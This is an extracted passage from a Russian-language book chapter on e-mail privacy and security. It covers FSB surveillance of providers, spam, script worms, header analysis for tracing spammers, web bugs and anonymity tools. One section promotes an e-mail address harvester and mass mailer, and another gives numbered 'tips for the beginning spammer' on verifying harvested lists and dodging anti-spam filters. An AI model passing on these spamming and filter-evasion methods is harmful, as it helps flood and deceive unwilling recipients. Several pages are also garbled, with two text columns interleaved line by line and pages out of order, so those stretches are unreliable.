отныне не смогут декларировать конфиденциальность пересылки
данных.
Так назначено судьбой
Необходимость в защите
Электронная почта, как впрочем и обычная, является важ
ным атрибутом нашей privacy, инструментом обмена информаци
ей частного характера. Но она немедленно перестает быть тако
вым, если нарушаются три важных условия. Первое: текст
сообщения доступен только отправителю и адресату. Второе: уве
ренность в том, что полученное письмо принадлежит тому чело
веку, чья подпись стоит под этим письмом. Третье: возможность
отправить письмо, оставшись, в случае необходимости, аноним
ным. Обсуждение первого относится к области гражданской
криптографии, что требует отдельного разговора. Мы же рассмо
трим последние два вопроса.
Но сначала мы предлагаем вашему вниманию статью Лео
нида Коника «ФСБ приглядит за электронной почтой» чтобы вы
сами могли убедиться в реальной необходимости защиты своей
privacy:
«Вслед за сотовыми и пейджинговыми операторами Петербур
га органы ФСБ добрались и до компаний, предоставляющих услуги
доступа к компьютерным сетям (провайдеров).
Компании обязаны обеспечить спецслужбам возможность кон
троля любых передаваемых данных, в частности — сообщений, по
сылаемых по электронной почте. Так же, как и в случае с сотовы
ми и пейджинговыми фирмами, провайдеры обязаны за свой счет
создать такие возможности и предоставить Федеральной службе
безопасности соответствующую аппаратуру для перехвата инфор
мации. Эта аппаратура (выносной пульт) выводится непосредствен
но в органы ФСБ, поэтому какой либо контроль со стороны компа
ний невозможен.
E mail «безопасная»
19
В отличие от сотовых и пейджинговых собратьев, провайде
ры пока не получили директивы от Минсвязи. Но, по словам гене
ральных директоров компаний, «люди в штатском» уже наведыва
лись к ним в офисы.
Собственно, в лицензиях провайдеров всегда присутствовала
фраза: «Сеть должна отвечать эксплуатационно техническим тре
бованиям по обеспечению и проведению оперативно розыскных меро
приятий в соответствии с Законом «Об оперативно розыскной де
ятельности (ОРД) в РФ»». Однако реально до сих пор никто не
требовал соблюдения этого пункта.
Сейчас Госсвязьнадзор — ведомство, контролирующее дея
тельность компаний связи, ведет переоформление лицензий провай
деров. Условием переоформления лицензии является строгое выпол
нение всех ее пунктов, в том числе и о внедрении аппаратуры
контроля.
Некоторые компании уже выполнили все требования лицензии.
Они внесли доработки в используемое программное обеспечение, а
также снабдили органы ФСБ выносным пультом в виде компьюте
ра. Формально компьютеры отдаются не безвозвратно, а во «вре
менное пользование». Компании надеются, что им компенсируют хо
тя бы часть затрат.
Служба дни и ночи
Генеральный директор компании «Петерлинк» заметил, что
многие провайдеры в Петербурге используют каналы связи сети Rel
com. Поэтому проще и дешевле было бы не озадачивать каждого про
вайдера проблемами розыскной деятельности, а в складчину подсое
динить один выносной пульт прямо к петербургскому узлу Relcom на
Марсовом поле.
20
E mail «безопасная»
Безопасность E mail
Безопасность E mail
Технические специалисты компьютерных фирм говорят, что
перехвату поддается лишь электронная почта (идущая в режиме off
line). Для того чтобы «поймать» сообщение, посылаемое по сети
Internet в режиме прямого доступа (on line), необходимо вести кон
троль постоянно: никто не может предсказать, в какой момент
времени отправит сообщение именно интересующий спецслужбу че
ловек. Постоянный контроль требует мобилизации огромных сил, к
тому же он противоречит Закону об ОРД. В нем говорится о том,
что проведение оперативно розыскных мероприятий, затрагиваю
щих охраняемые законом тайну переписки, телеграфных сообщений,
телефонных и иных переговоров, допускается лишь для сбора инфор
мации о лицах, подготавливающих, совершающих или совершивших
тяжкие преступления, и только с санкции прокурора или при нали
чии судебного решения.
Алекс — Юстасу
Помимо законов РФ «Об ОРД» и «О связи» в открытой печа
ти не было опубликовано ни одного приказа Минсвязи или ФСБ об
организации работ по обеспечению оперативно розыскных меропри
ятий на сетях связи.
Между тем Конституция РФ (ст. 15 разд. 3) гласит: «Любые
нормативные правовые акты, затрагивающие права, свободы и обя
занности человека и гражданина, не могут применяться, если они не
опубликованы официально для всеобщего сведения».
В сложившейся ситуации у провайдеров существует три ва
рианта действий: отказаться от бизнеса, пытаться отстоять свои
права (хотя бы на компенсацию расходов) или подчиниться. Прак
тически все предпочитают третий путь. Провайдеры уверены, что
весть о доступе спецслужб к электронной почте не отпугнет кли
ентов. «В отличие от абонентов сотовых и пейджинговых компа
ний, наши клиенты вряд ли передают какие либо секреты. Компью
терные сети — это просто средство общения», — ответственно
заявляют они.»
А теперь от теории перейдем к практике.
E mail «безопасная»
21
Защита от SPAM
Термин «спам» или «спэм» (англ. spam) ведет свое проис
хождение от старого (1972) скетча английской комик группы
Monty Python Flying Circus, в котором посетители ресторанчика,
пытающиеся сделать заказ, вынуждены слушать хор викингов,
воспевающий мясные консервы (SPAM). В меню этого ресторана
все блюда состояли из содержимого этих консервов.
Реклама — двигатель торговли! Эта простая истина извест
на всем. Реклама же на просторах «всемирной паутины» может ве
стись двумя способами, знакомыми каждому: баннерами и массо
вой рассылкой e mail сообщений, проще говоря — спамом.
Первый способ хорош, но чтобы его применить, надо иметь в
Интернете сайт или хотя бы страницу. И плюс к этому, необхо
димо рисовать или заказывать баннер, участвовать в баннерооб
менных системах и т. д.
Второй способ значительно легче, доступнее и эффективнее.
Составили спам лист, написали сообщение — и можете пожинать
плоды своего труда. Да, спам — это самый незаконный, но в то
же время самый эффективный метод рекламы, при этом не стоя
щий «рекламодателю» абсолютно ничего. Стоит заметить, что ин
формативность баннера, а точнее, анимированной картинки, не
идет ни в какое сравнение с текстом полноценного сообщения.
Баннер теоретически могут увидеть многие, но далеко не все на
него в принципе обратят внимание, и еще меньше — кликнут. Что
же касается рассылки, то можно быть уверенным, что ваше сооб
щение прочитают почти все пользователи, которым оно было ад
ресовано, а число получивших его может варьироваться от одно
го и до бесконечности — в зависимости от того, сколько e mail
адресов в вашем спам листе.
Возникает логичный вопрос: а где взять эти самые адреса?
Причем желательно адреса не каких то «василиев пупкиных», ко
торым ваш товар или услуга изначально глубоко безразличны, а
людей, которые, хотя бы в определенной степени, представляют
из себя «target group» (по русски говоря, целевую аудиторию): ну,
22
E mail «безопасная»
Безопасность E mail
Безопасность E mail
к примеру, ищущих работу или интересующихся сотовыми теле лять/добавлять ссылки, сохранять проекты и т.д. Кстати, первую
                                                 фонами. В этой связи я хочу рассказать о программе Mail Grab тысячу адресов можно получить, даже не выходя в Сеть — при по
                                                                                          ber от фирмы DEMETRIUS Software, которая поможет вам со мощи локального поиска. Для этого достаточно лишь обработать
                                                                                                                    брать спам лист из огромного количества e mail. А идущая в кэш вашего браузера или базу данных почтовой программы. На
                                                                                                                                                              комплекте с полной версией Mail Grabber'а программа Mail Sender чиная с версии 3.4 программа ищет адреса не только в Интерне
                                                                                                                                                                                               разошлет вашу рекламу или сообщение по указанным адресам. те и кэше браузеров, но и на указанном вами диске.
Процесс инсталляции, который при наличии WinZip'а мож Есть в Mail Grabber'е еще две крайне полезные функции: это
                                       но провести прямо из архива, не занимает много времени. Те, кто функция пакетной обработки и режим защиты от разрывов соеди
                                                                                         в прошлом пользовался подобными программами (например, нения. Пакетная обработка необходима тем, кто хочет оставить
                                                                                                                                        Advanced Email Extractor), знают, что главное для этих утилит — программу работать в автономном режиме, например, на ночь.
                                                                                                                                                                      полная функциональность и умение быстро, надежно работать. В Осуществляется это очень просто: если ссылки, собранные с за
                                                                                                                                                                                                                         силу этого создатели аналогичных программ довольно мало уде данной вами начальной страницы, закончились, то программа ав
                                                                                                                                                                                                                                                                             ляли вниманию интерфейсу, и в этом отношении Mail Grabber — томатически продолжит поиск на странице, которая первой ука
                                                                                                                                                                                                                                                                                                                    приятное исключение. Помощь, имеющаяся в программе, на рус зана в списке пакетной обработки. Режим защиты от разрывов
                                                                                                                                                                                                                                                                                                                                                                    ском языке и продумана до малейших деталей, что значительно позволяет пользователям с плохой связью при обрыве соединения
                                                                                                                                                                                                                                                                                                                                                                                                                      упрощает освоение всех опций и настроек. не начинать поиск заново, а продолжить его с того места, где про
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   изошел обрыв.
Принцип работы таков: вы задаете URL исходной страни
цы, который вписывается в поле сверху, и программа начинает
проверять данный сайт на наличие e mail'ов, сохраняя найденные
адреса. В день можно получить до 10 тысяч уникальных почтовых
адресов при условии нормальной связи с провайдером.
Перед началом работы желательно настроить программу.
Во первых, не помешает определить максимальную глубину по
иска. По умолчанию этот параметр стоит без ограничений, то есть
Mail Grabber пойдет по всем внешним ссылкам, найденным на
этом ресурсе. В разделе «Опции» можно выбрать настройки про
кси сервера, количество максимально обрабатываемых HTML
страниц, включить возможность поиска адресов, закодированных
программой MailTo Encrypter, сохранять содержание всех обрабо
танных HTML страниц (в случае окончания поиска или отмены),
установить, по каким параметрам узнавать e mail адрес, вести
журнал событий, включить почтовый фильтр и т.д.
Воспользовавшись программой Mail Sender, поставляемой в
комплекте с полной версией Mail Grabber'а, по собранным e mail
адресам можно провести автоматическую рассылку. Перед нача
лом работы с программой необходимо только правильно настро
ить SMTP сервер.
Пожалуй, Mail Sender является самым качественным и мощ
ным из бесплатных аналогов, так как он поддерживает неограни
ченное число аккаунтов, умеет удалять недействующие e mail'ы,
повторяющиеся адреса, предоставляет возможность использова
ния макросов. Есть возможность выбирать тип отправляемого
письма (Plain Text или HTML), метод отправки и дополнительные
опции (To: CC:, BCC:), кодировку письма (WIN, KOI8, DOS).
Правой кнопкой мыши в поле «Текст письма» можно добавлять
тэги HTML и работать с ними. Для проверки результата сущест
вует опция предварительного просмотра.
Теперь начинаем собственно поиск. Процессом поиска
можно руководить в режиме реального времени, например, уда
E mail «безопасная»
23
24
E mail «безопасная»
Безопасность E mail
Безопасность E mail
Советы начинающему спамеру
Червивая почта и порноспам
Совет No1
Перед отправкой очередной партии писем обязательно про
верьте существование адресов, на которые собираетесь отправлять
рассылку, иначе ваш почтовый ящик будет завален возвратами
писем типа «Undeliverable message».
Для этой цели рекомендую воспользоваться программой
Advanced Mail List Verify.
Совет No2
Не пишите адреса получателей в полях To: и Сс: (кому и ко
пия) через запятую, т.к. получатель легко увидит, кому еще посла
ны такие сообщения и сразу поймет, что это спам. И потом, за
чем вам светить свою базу данных потенциальных клиентов.
Лучше для этих целей пользоваться специальными почтовыми
программами, которые поддерживают адреса для рассылки во
внешнем файле. Например: DiffondiCool.
Совет No3
Создавая новые почтовые адреса на бесплатных серверах, не
давайте им названия с большим количеством цифр, например:
12345@hotmail.com, abc9876@mail.ru и т.д. Существует целый ряд
антиспамерских программ, которые анализируют обратные адре
са входящей почты и рассматривают адреса с большим количест
вом цифр как спамерские. Одной из таких программ является
Spam Buster.
Совет No4
Очень удобным и полезным средством для распространения
информации, являются автореспондеры — автоответчики элек
тронной почты. Это почтовые программы, которые автоматичес
ки отправляют заранее подготовленные файлы (прайс листы, ин
формационные бюллетени и т.д.) по адресу, с которого приходит
запрос.
Получить один из таких автореспондеров можно по адресу:
http://www.realreply.com.
E mail «безопасная»
25
Если, открыв почтовый ящик, вы обнаружили там червяка
или полтонны мусора, вам не повредит побеспокоится о надеж
ной защите.
Письма — это черви почты...
Помимо писем, содержащих троянов и макровирусы, могут
быть опасны и электронные письма, вовсе не содержащие ника
ких вложений, зато зараженные так называемыми скрипт вируса
ми (почтовыми вирусами червями). Среди наиболее известных,
следует, в частности, упомянуть KakWorm, Stages и ILOVEYOU
(LoveLetter). Они написаны на Visual Basic for Applications (VBA),
используют Windows Scripting Host (машину для запуска скрипт
программ) и крайне опасны (например, суммарные убытки от рас
пространения ILOVEYOU превысили 12 миллиардов долларов).
При этом против них часто бывают бессильны традиционные ан
тивирусные средства, которые не в силах обнаружить присутствие
вируса, если он не обращается к жесткому диску, а оперирует ис
ключительно в оперативной памяти компьютера. Кроме того,
крайне легким (за счет среды разработки) является создание но
вых вариантов данных вирусов. В случае KakWorm, заражение во
обще происходит просто при открытии письма, и не требует со
вершения каких либо еще дополнительных действий. Что же
можно рекомендовать тем, кто не желает страдать от данного ви
да вирусного программного обеспечения?
Наиболее радикальная (и эффективная) рекомендация — не
пользоваться программным обеспечением одной о о очень изве
стной в компьютерном мире компании. При всем моем уважении
к Microsoft и лично к Биллу Гейтсу, почему то все наиболее рас
пространенные почтовые вирусы, включая KakWorm и ILOVEY
OU, опасны только для пользователей ОС Windows, браузера
Microsoft Internet Explorer и почтового клиента Microsoft Outlook.
Конечно, данное обстоятельство можно объяснить общей распро
страненностью вышеперечисленных программ, но равнодушие
программистов Microsoft к такому качеству программ, как безо
26
E mail «безопасная»
Безопасность E mail
Безопасность E mail
пасность, тоже стало почти легендарным. Так что если вас впе
чатляет цифра в 3 миллиона компьютеров, зараженных за первые
три дня распространения вируса ILOVEYOU, в качестве почтово
го клиента установите себе лучше The Bat! (кстати, полнофункци
ональная Shareware версия The Bat! Halloween Edition 1.47, рабо
тающая 30 дней, снабжена средством защиты и от новых
PIF вирусов), а в качестве веб браузера — Netscape Communica
tor или Opera. Впрочем, для тех, кому приведенный выше совет
не подходит по тем или иным соображениям, также существует
выход из положения. Так, например, Антивирусная лаборатория
Касперского создала эвристический анализатор AVP Script Check
er, специально предназначенный для борьбы со скрипт вирусами.
Разработчики описывают принцип его действия следующим обра
зом: AVP Script Checker — это антивирусная программа, которая
обеспечивает защиту вашего компьютера от проникновения
скрипт вирусов и червей, действующих по принципу «LoveLetter»
и распространяющих себя при помощи почтовых служб... Перед
выполнением этих скриптов AVP Script Checker выполнит эврис
тический анализ кода и произведет проверку с помощью AVP Мо
нитора (если он установлен и запущен). При обнаружении виру
са или подозрительного кода на экран будет выведено
соответствующее предупреждение и скрипт не будет выполнен.
Остается добавить, что распространяется AVP Script Checker сво
бодно и весит 946 килобайт.
Кроме него, в Cети можно найти и другие утилиты, пред
назначенные для борьбы со скрипт вирусами. Например, свобод
но распространяемый MailCleaner (818 килобайт, сайт разработ
чика). Эта утилита работает в паре с почтовым клиентом Outlook
или Outlook Express, проверяет все пришедшие вам письма, и, ес
ли обнаружит что то подозрительное — сообщит вам и не допус
тит заражения. Кроме того, на сайте разработчиков можно брать
ежедневные (!) обновления антивирусных баз данных программы.
входит даже возможность показа списка адресов, по которым ус
пел разослать свои копии вирус.
О, этот ненавистный спам...
Кого не доставали рекламные письма порно сайтов или он
лайновых казино, заваливающие в огромных количествах элек
тронные почтовые ящики? Для того, чтобы уберечься от спама,
следует, в первую очередь, не давать свои e mail адреса кому по
пало. Лучше всего вообще завести себе отдельный мусорный ад
рес на каком нибудь бесплатном почтовом сайте и пользоваться
им в барахолках, на веб форумах, в ньюс конференциях, в чатах,
на серверах знакомств, в общении с малознакомыми людьми и т.д.
Если этот ящик и начнут заваливать спамовым мусором, то будет
не жалко его удалить и завести себе новый — для таких же целей.
Эта же мера поможет избежать неприятностей с любителями бом
бардировать чужие почтовые ящики письмами с двухмегабайтны
ми вложениями и засыпать их посылкой по одному и тому же ад
ресу нескольких тысяч писем одновременно.
Кроме вышеперечисленного, в борьбе со спамом вам помо
гут специально предназначенные для этого утилиты. Так, напри
мер, Telos 2.0 (800 килобайт, сайт разработчика) сканирует содер
жимое почтовых ящиков на предмет обнаружения заголовков
спамовых писем (какие письма отнести к спаму, определяет сам
пользователь) и удаляет их. Программа может работать в автома
тическом режиме, сканируя почтовые ящики через определенные
промежутки времени. Telos можно настроить и для уничтожения
писем, приходящих с определенных адресов.
Специально для борьбы с вирусом ILOVEYOU и его послед Рекомендую также утилиту Spam Hater 2.09 (834 килобайта),
                                     ствиями предназначена программа IloveYouCleaner, распростра обеспечивающую, на мой взгляд, наиболее эффективную и гиб
                                                                            няемая бесплатно и весящая всего 728 килобайт. В ее функции кую защиту от спама. Она не только позволяет отделить спамо
                                                                                                                                                                                                                                      вые и нежелательные письма по заранее заданным критериям, но
                                                                                                                                                                                                                                                                                        и в автоматическом режиме отправляет по адресам, с которых
                                                                                                                                                                                                                                                                                                                                        пришел спам, а также в службу поддержки провайдера, которому
                                                                                                                                                                                                                                                                                                                                                                                         принадлежат IP адреса, указанные в заголовках писем, возмущен
                                                                                                                                                                                                                                                                                                                                                                                                                                          ные петиции (в программе есть значительное количество уже го
E mail «безопасная» 28
27
E mail «безопасная»
Безопасность E mail
Безопасность E mail
товых шаблонов, а можно формировать негодующие сообщения и
собственноручно). Программа совместима практически со всеми
почтовыми клиентами: Eudora, Outlook, Outlook Express, Netscape
Messenger.
Для многих пользователей Интернет спам (рассылка всевоз
можно рекламы и мусора в ваш почтовый ящик) стал настоящим
бедствием. Основные рекомендации для защита от спама
следующие:
■
■
пишите письма в конференции Usenet
исключительно с левых (бесплатных) адресов,
потому что именно письма в конференции Usenet
являются основной «засветкой» для спамеров. А если
будет много спама, то такой адрес можно что
называется выбросить и за пару минут сделать
другой подобный;
установите какую либо программу фильтр для
E mail. Существует великое множество таких
программ — все они доступны на таких бесплатных
серверах как www.shareware.com и www.download.com.
Спам — мерзкое явление. Одни считают спамом пакетную
рассылку с количеством получателей более 25, другие — письма
от незнакомца, третьи — получение информации, в которой не за
интересованы и которая им просто не нужна, и не зависит от то
го, лично им это предназначалось или группе товарищей.
Что можно сказать однозначно — это очень сильно засоря
ет почтовый ящик, отнимает время и здорово злит. Ну представь
те, вы женились, отдыхаете с молодой, а вам по телефону, по со
товому, на пейджер и просто в двери ломятся старые друзья с
подругами, для которых вы всегда желанны, а вот они теперь уже
и не очень.
Как можно попасть на удочку спамеру? Легко — конферен
ция. Люди толпами бродят по чатам и конференциям и оставля
ют там свои адреса. Затем справочники, правда они пока для Рос
сии не очень актуальны. Газеты, визитки, объявления. Ну и,
E mail «безопасная»
29
наконец, это может быть «ненавязчивой» услугой, от которой по
том трудно избавиться.
Живые примеры — сервер бесплатных страничек XOOM.
COM. За то, что вы становитесь пользователем их сервиса, они
вас обязывают получать свои рекламки чуть ли не каждый день.
Честно говоря, они закрыли мне доступ по ftp после первого сли
ва сайта. На все письма мне отвечал их робот. А реклама шла по
стоянно. Второй пример — Кенигсбергская газетенка «Новые Ко
леса». Я им отправил письмо с просьбой объяснить про их
растаможку и как выглядят документы авто, растаможенных на
область и на Россию. В результате вместо ответа каждую неделю
у меня в ящике отстой.
Итак, как бороться.
В борьбе со спамом юзер предоставлен сам себе. Тут он дол
жен полагаться в основном только на себя.
В целях профилактики лучше не светить свой реальный ад
рес. Достаточно сервисов, предоставляющих форвард адресы. Я
пользуюсь уже давно usa.net. И благодаря их фильтрам все новые
колеса и xoom.com’ы сразу уходят в мусор и не доходят до моего
реального ящика. Фильтры своего почтового клиента я не исполь
зую вообще. Но! Этот способ работает только против тех, кто не
меняет от рассылки к рассылки своих обратных адресов, иници
алов и т.д.
Профессиональные спамеры используют разного рода про
граммки, позволяющие постоянно менять им адреса отправки,
фальсифицировать тексты заголовков. И если появляется подо
зрение, что вы стали жертвой профессионального спамера — об
ращайтесь за помощью к своему провайдеру. Опишите проблему
и приложите исходник сообщения спамера. Не надо начинать
бомбить его письмами — они уйдут в никуда. Никогда не отве
чайте спамеру сообщением вроде того, что вас там нет, что он ду
рак или чем нибудь в этом духе. Для спамера это означает зеле
ный свет.
30
E mail «безопасная»
Безопасность E mail
Безопасность E mail
Существует масса программок, которые могут имитировать
ответ робота о неправильном адресе, просматривать и удалять не
нужные сообщения прямо на сервере.
И, наконец, самым любопытным небольшая лекция о том,
как определить автора ненужного или оскорбительного письма.
Итак, вы получили «мусор» и хотите добраться до отправи
теля или его провайдера, чтобы высказать последнему все, что вы
думаете о некоторых из его клиентов.
Прежде всего, включите режим просмотра заголовков сооб
щения своей почтовой программы. Вы увидите что то похожее на
следующие строки:
Return Path: 93890998@ix.netcom.com
Received: from linux.aaanetworks.net (linux.aaanetworks.net
[38.229.249.252])
by pinochet.cityline.ru (8.8.8/t/97 Nov 22) with ESMTP id
IAA11186
for <uptoroad@cityline.ru>; Fri, 30 Jan 1998 08:14:07
+0300 (MSK)
From: 93890998@ix.netcom.com
Received: from mail.aaanetworks.net (sdn ts 002flmelbP04.
dialsprint.net [206.133.70.39]) by linux.aaanetworks.net
(8.8.5/8.8.5) with SMTP id BAA24025;
Fri, 30 Jan 1998 01:04:51 0500
Received: from
mailhost.ix.netcom.com(alt1.ix.netcom.com(246.2.92.63.9) by
ix.netcom.com (8.8.5/8.6.5) with SMTP id GAA01271
for <JuDa1635@ix.netcom.com>; Thu, 29 Jan 1998 23:20:10
0600 (EST)
Date: Thu, 29 Jan 98 23:20:10 EST
To: JuDa1635@ix.netcom.com
Subject: Mail Your Message to Millions
Message ID: <K896Y49058.STTP886772@ix.netcom.com>
Reply To: JuDa1635@ix.netcom.com
X PMFLAGS: 128 0
E mail «безопасная»
31
Comments: Authenticated sender is <JuDa1635@ix.netcom.com>
X UIDL: 126op9623er9987ghty6322wee698tl1
Во первых, все, что находится ниже поля Date: можно сме
ло игнорировать. Для почтовых серверов — это тело сообщения,
а не заголовки. Поэтому отправитель может проставить в этих по
лях все, что его душе угодно. Просто не обращайте на это внима
ния. Заголовки From: тоже легко подделываются, поэтому обра
щать большого внимания на них тоже не стоит.
Нам важны заголовки Received:. Рассмотрим первый из них.
На самом деле он является последним, поскольку каждый почто
вый сервер, через который проходит ваше сообщение, добавляет
свой «штамп» в начало. Таким образом, первый из вышеприве
денных заголовков Received: добавлен почтовым сервером вашего
провайдера. Поэтому он соответствует действительности.
Received: from linux.aaanetworks.net (linux.aaanetworks.net
[38.229.249.252])
by pinochet.cityline.ru (8.8.8/t/97 Nov 22) with ESMTP id
IAA11186
for <uptoroad@cityline.ru>; Fri, 30 Jan 1998 08:14:07
+0300 (MSK)
О чем он нам говорит? «Перевод» будет звучать примерно
так: почтовый сервер pinochet.cityline.ru получил в пятницу, 30 ян
варя 8:14:07 по московскому времени сообщение для адресата
uptoroad@cityline.ru от почтового сервера linux.aaanetworks.net с IP
адресом 38.229.249.252.
Скорее всего, указанный адрес действительно присвоен
компьютеру, одно из имен которого linux.aaanetworks.net. Прове
рить это можно при помощи множества программ, позволяющих
по IP адресу определить имя машины и, наоборот, по имени —
IP адрес. Можно воспользоваться и более быстрым подручным
средством. Например, запустить по этому IP адресу стандартный
ping. Сами результаты работы этой процедуры нас сейчас мало ин
тересуют, однако первое, что сообщает процедура, это имя маши
ны, адрес которой вы указали в качестве ее параметра (однако ес
32
E mail «безопасная»
Безопасность E mail
Безопасность E mail
ли оно не совпадет с указанным в заголовке, то это еще ничего
не значит, поскольку любому IP адресу может быть поставлено в
соответствие несколько имен или не поставлено ни одного).
Следующее поле, From:, тоже можно смело игнорировать. А
вот дальше начинается детектив. Последовательность заголовков
Received: в «честном» сообщении прерываться не должна. У нас
же она прерывается, что свидетельствует о вмешательстве спаме
ра. Более того, время, указанное в каждом следующем из них,
сильно отличается от времени, указанном в предыдущем, чего то
же быть не должно: маловероятно, чтобы письмо гуляло между
машинами так долго.
Received: from mail.aaanetworks.net (sdn ts 002flmelbP04.
dialsprint.net [206.133.70.39])
by linux.aaanetworks.net (8.8.5/8.8.5) with SMTP id
BAA24025;
Fri, 30 Jan 1998 01:04:51 0500
Этот заголовок похож на истинный. Тем не менее проверим.
Обратите внимание, имя получателя указано дважды: как
mail.aaanetworks.net
(это
то,
что
ввел
спамер)
и
sdn ts 002flmelbP04.dialsprint.net — это то имя, которое почтовый
сервер «вычислил» по IP адресу, приведенному в квадратных
скобках (информации, которая заключена в квадратные скобки,
как правило, можно доверять). Если мы проверим соответствие
цифрового IP адреса и имени машины, наши опасения наверня
ка подтвердятся: точка входа спамера в Internet действительно бы
ла.
вставлен программой массовой рассылки StealthMail. Сочетание
GAA и 0600 (EST) — визитная карточка этой программы. Может
также встречаться другое сочетание: идентификатор ХАА и время
0700 (EST). Такое сочетание характерно для более поздних вер
сий этой же программы.
Наконец, обратите внимание на формат заголовка. Вторая
и последующие его строки начинаются с первой позиции, так же
как и первая. В RFC822 есть требование: вторая и последующие
строки заголовков должны начинаться по крайней мере с одного
«пустого» символа (пробела или табулятора).
Вот, собственно, и все. Мы установили, что перед нами
письмо с фальшивым заголовком и что спам был отправлен поль
зователем Sprint или кем то, кто воспользовался его почтовым
сервером. Поэтому свою жалобу направим именно туда. Вы спро
сите, кому же писать? Все почтовые серверы обязаны иметь адрес
postmaster, поэтому смело направляйте свою жалобу туда. Кроме
того, крупные провайдеры обычно имеют специальный адрес для
жалоб. Обычно он выглядит так: abuse@someprovider.com. Если вы
не уверены, куда посылать жалобу, зайдите на сайт Internic
(www.internic.net) и воспользуйтесь процедурой whois, которая по
адресу домена (someprovider.com) сообщит вам всю информацию
о домене и его владельцах, лежащую в базе данных. Там же будет
указан и адрес для административных контактов. Он же иногда
называется zone contact. Вот по этому адресу и отошлите свою пре
тензию. Только, пожалуйста, будьте вежливы. Эти люди постра
дали от спамера не в меньшей степени, чем вы.
Следующий заголовок фальшивый. Чтобы понять это, нам Если же вы получили спам с национального домена, напри
                                            не потребуется никаких вспомогательных процедур. Во первых, мер, .ru, то поиск на сайте Internic может и не дать результатов.
                                                                                               время в нем проставлено «марсианское». Аббревиатура EST рас В этом случае можно обратиться в соответствующие националь
                                                                                                                                               шифровывается как Eastern Standard Time, которое отстает от ные службы.
                                                                                                                                                                               Гринвича на пять часов, а не на шесть, как указано в заголовке. 
                                                                                                                                                                                                                                Во вторых, идентификатор сообщения начинается буквами GAA. 
                                                                                                                                                                                                                                                                               Само по себе это ни о чем не говорит, но в сочетании с часовым 
                                                                                                                                                                                                                                                                                                                               поясом 0600 (EST) однозначно указывает на то, что заголовок 
E mail «безопасная» 34
33
Другим весьма эффективным средством идентификации
спамера является служба DejaNews (www.dejanews.com), которая
является «памятью всей Usenet». Эта система индексирует и
заносит в свою базу данных практически все сообщения,
E mail «безопасная»
Безопасность E mail
Безопасность E mail
появляющиеся в Usenet. Дело в том, что сообщения о полученном
спаме и принятых против этого мерах публикуются в Usenet.
Поэтому если ваш спамер хоть раз «засветился» в теле
конференциях (а он скорее всего «засветился»), то, зная хоть
какую то информацию о нем, можно попытаться отыскать его
«следы». Если повезет, то вы сможете узнать реальный адрес
спамера и даже номер его телефона.
Не подпускайте к себе Web шпионов
Предположим, вы пригласили меня на обед и пока хлопо
тали на кухне, я установил подслушивающие устройства рядом с
телевизором, возле почтового ящика и под кроватью. Теперь из
своего дома я могу без всякого ведома с вашей стороны следить
за тем, что у вас происходит. Вам, должно быть, покажется, что
это несколько чересчур, не правда ли?
Так вот, вполне возможно, нечто похожее происходит с ва
ми прямо сейчас при посредстве вашего ПК. Когда я распишу,
как и большие компании, и отдельные лица попирают личную не
прикосновенность, то в вас закипит гнев. Успокойтесь, есть не
сколько изящных инструментов, позволяющих противостоять
различным вторжениям.
Поднимите руки: кто из вас использует программы GoZilla,
PkZip for Windows, GetRight или часто обращается к разделу
Download сайта RealPlayer? Спонсируемые за счет рекламы вер
сии этих и им подобных продуктов иногда называют «программа
ми шпионами» — spyware. Они помещают на ваш компьютер сле
дящие аплеты (tracking applets), которые управляют размещением
там рекламы. Впрочем, даже если вы удалите эти программы, то
аплеты могут где нибудь «застрять» и передавать данные о ваших
«компьютерных привычках» обратно на свои серверы.
Анонимные Web браузеры
50 долларовой программой Freedom компании Zero Knowledge, я
соорудил заслон, и теперь мои электронная почта, путешествия
по Web, участие в тематических конференциях и сетевые разгово
ры — все это проходит через анонимные серверы. Так что когда
вы читаете мою почту, поступившую через Freedom, или обнару
живаете меня на своем сайте, то никаких сетевых следов не полу
чаете.
Итак, «Web жучки» — незаметные фрагменты программно
го текста, встроенные в послания электронной почты. Обычно это
делают всевозможные распространители «макулатурной почты»
тогда, когда хотят просто удостовериться, что имеют в своем рас
поряжении реальные электронные адреса. Стоит вам только про
смотреть или раскрыть подобное послание ловушку, как скрытое
уведомление о вручении сразу же вернется к отправителю. «Жу
чок» также позволяет отправителям определять адрес вашей эле
ктронной почты и отслеживать, посещаете ли вы их сайт. Чтобы
увидеть «Web жучка» в действии, отправляйтесь по адресу:
www.mackraz.com/trickybit/readreceipt, но приготовьтесь к непри
ятному сюрпризу. Потом загрузите пробную версию Freedom из
раздела Downloads сайта PCWorld.com, повторите все еще раз и
тогда увидите, что «жучок» будет заблокирован.
Конфиденциальность — как у открытки
Если вы считаете, что Сеть затрудняет хищение персональ
ных финансовых и других данных, то посетите специальный сайт
Федеральной комиссии по торговле (ФКТ), посвященный краже
идентификационных номеров (www.consumer.gov/idtheft). Мы
снабжаем посещаемые нами Web сайты многочисленными по
дробностями о себе и вносим немало сведений в отправляемую
электронную почту. С помощью надлежащих инструментов хаке
ры могут просматривать хранящиеся на Web узлах данные лично
го характера и читать нашу электронную почту так же просто, как
утреннюю газету.
Я знаю простой способ стать невидимым для Web сайтов и Я не считаю такой уж приватной всю отправляемую мною
                                          защититься от мерзопакостных «Web жучков». Воспользовавшись электронную информацию, однако полагаю священными и не
E mail «безопасная» 36
35
E mail «безопасная»
Безопасность E mail
Безопасность E mail
прикосновенными послания своему лечащему врачу, бухгалтеру
аудитору, брокеру и парикмахеру, хранящему секреты моей шеве
люры. Поэтому я работаю с программой Sigaba, которая шифру
ет электронную почту и вставляет уникальный ключ,
позволяющий идентифицировать меня. Прочесть мои послания
могут только те, кому я их адресовал. Sigaba бесплатна, проста в
использовании и, будучи раз настроена, не вызывает хлопот. Она
интегрируется с используемым мною пакетом электронной поч
ты. Когда я посылаю ответ или новое послание, то могу зашиф
ровать его, сделав один щелчок на значке Sigaba. Чтобы читать за
шифрованную почту, нужно зарегистрироваться на сайте
www.sigaba.com. Можно не устанавливать эту программу на свой
ПК, а получать всю зашифрованную почту на Web узел компа
нии. При этом можно использовать существующую учетную за
пись электронной почты и вложения, а также вводить ограниче
ния, определяющие, когда другие прочтут отправляемые мною
сообщения. Компания поддерживает большинство почтовых про
грамм.
Борьба за сетевую неприкосновенность
Сеть угодила в скрытую ловушку. Все чаще происходит утеч
ка конфиденциальной информации, а вмешательство в личную
сферу потребителей и компаний стало обыденностью. Ребята, у
вас за спиной прокручиваются всякие делишки, а вы об этом да
же и не подозреваете.
Слышится, как вы спрашиваете меня: «Насколько плохи де
ла?» Вы, вероятно, уже знаете, что компании отслеживают пере
